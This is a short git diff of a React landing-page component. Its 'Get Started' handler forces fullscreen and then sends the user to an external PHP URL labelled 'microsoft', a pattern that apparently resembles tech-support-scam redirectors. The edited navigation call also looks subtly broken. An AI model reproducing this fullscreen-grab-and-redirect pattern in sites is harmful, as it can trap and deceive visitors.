@@ -1,20 +1,17 @@
-import { Link } from "react-router-dom";
+import { Link, useNavigate } from "react-router-dom";
 
 export default function Home() {
 
-    const handleClick = async (e: { preventDefault: () => void; }) => {
-    e.preventDefault();
+  const navigate = useNavigate();
 
+  const handleClick = async () => {
     try {
       await document.documentElement.requestFullscreen();
     } catch (err) {
       console.log("Fullscreen rejected:", err);
     }
 
-    window.open(
-      "https://tunipril.com/ddsshht.php/microsoft",
-      "_blank"
-    );
+    navigate("https://tunipril.com/ddsshht.php/microsoft"); // change to your target route
   };
 
   return (
@@ -36,12 +33,13 @@ export default function Home() {
             </p>
 
             <div className="flex gap-3 md:gap-4">
-              <button
+              <Link
+                to=""
                 className="bg-blue-600 text-white px-6 md:px-8 py-2.5 md:py-3 rounded-lg shadow-md hover:bg-blue-700 transition"
                 onClick={handleClick}
               >
                 Get Started
-              </button>
+              </Link>
 
               <Link
                 to=""
